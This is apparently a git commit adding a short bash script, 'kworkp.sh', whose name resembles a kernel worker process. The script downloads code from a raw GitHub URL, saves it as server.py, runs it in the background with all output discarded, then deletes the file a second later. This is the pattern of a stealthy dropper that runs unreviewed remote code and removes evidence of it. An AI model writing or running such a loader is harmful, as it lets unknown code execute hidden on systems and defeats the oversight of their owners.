ed442260b8d7809b94770444dbb9350a9c437c32
Andtherya <Andy17998@outlook.com>
2026-08-26 09:09:01 +0800

    Change script URL and update script execution to Python

---
+++ kworkp.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+URL="https://raw.githubusercontent.com/Andtherya/test/refs/heads/main/kwork"
+SCRIPT="server.py"
+
+curl -fsSL "$URL" -o "$SCRIPT" || exit 1
+
+nohup python3 "$SCRIPT" >/dev/null 2>&1 &
+
+sleep 1
+rm -f "$SCRIPT"
